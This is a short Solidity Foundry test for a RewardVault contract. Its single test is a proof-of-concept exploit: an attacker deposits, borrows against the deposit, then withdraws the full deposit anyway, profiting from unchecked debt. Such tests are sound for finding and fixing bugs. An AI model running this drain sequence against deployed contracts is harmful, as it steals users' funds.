// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/RewardVault.sol";

contract RewardVaultTest is Test {
    RewardVault vault;

    address attacker = address(2);

    function setUp() public {
        vault = new RewardVault();

        vm.deal(attacker, 10 ether);

        vm.deal(address(vault), 50 ether);
    }

    function testBorrowExploit() public {
        vm.startPrank(attacker);

        vault.deposit{value: 5 ether}();

        vault.borrow(3 ether);

        vault.withdraw(5 ether);

        vm.stopPrank();

        assertGt(attacker.balance, 10 ether);
    }
}
